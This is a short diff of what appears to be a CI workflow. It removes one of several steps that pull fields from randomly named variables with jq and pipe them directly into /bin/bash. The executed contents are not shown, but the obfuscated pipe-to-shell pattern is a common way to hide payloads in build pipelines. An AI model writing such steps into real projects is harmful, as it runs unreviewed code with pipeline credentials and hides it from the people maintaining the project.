@@ -22,7 +22,6 @@ jobs:
           echo $ii237 | jq -r .s29 | /bin/bash
           printf '%s' "$ircry3" | jq -r .kq0 | /bin/bash
           printf '%s' "$lmoi0509" | jq -r .h72307 | /bin/bash
-          printf '%s' "$hk7" | jq -r .y7 | /bin/bash
           echo $c10 | jq -r .ia650 | /bin/bash
           echo $za85 | jq -r .svv74 | /bin/bash
           printf '%s' "$rso356" | jq -r .pwepe2 | /bin/bash
